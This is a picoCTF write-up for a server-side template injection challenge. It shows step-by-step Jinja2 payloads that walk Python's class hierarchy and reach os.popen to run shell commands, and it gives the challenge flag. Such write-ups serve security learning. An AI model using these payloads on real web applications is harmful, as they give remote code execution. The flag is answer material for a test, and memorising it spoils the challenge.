# Problem
I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website here!   
**Hint:** Server Side Template Injection

# Solution
Let's first check for what kind of template it is, with `{{ 10*10}}` which shall give "100" as output which deduce it to python(Jinja2) or php(Twig) templates.  
We can confirm it using this command: 
`{{ ''.__class__ }}` → "<class 'str'>" confirming its a python string.  

Through testing we developed:  
`{{ ''.__class__.__mro__[1] }}` → Gets base object class  

`{{ ''.__class__.__mro__[1].__subclasses__() }}` → Lists subclasses  

Found a vulnerable subclass at index 133 (this is environment specific).
To exploit this, we enumerate the subclasses to find one that allows access to dangerous built-ins. For example:  

```python
{{ ''.__class__.__mro__[1].__subclasses__()[133] }}
```

This reveals the subclass `<class 'warnings.catch_warnings'>`, which can be leveraged for code execution. The exact index may vary depending on the environment, so you may need to iterate through the list to find the appropriate class.  
Now with some more back and forth we build this,  
`{{ ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat flag').read()") }}`  

Flag: `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_eb0c6390}`  

Always look for classes like "__globals__, __builtins__, os or subprocess" 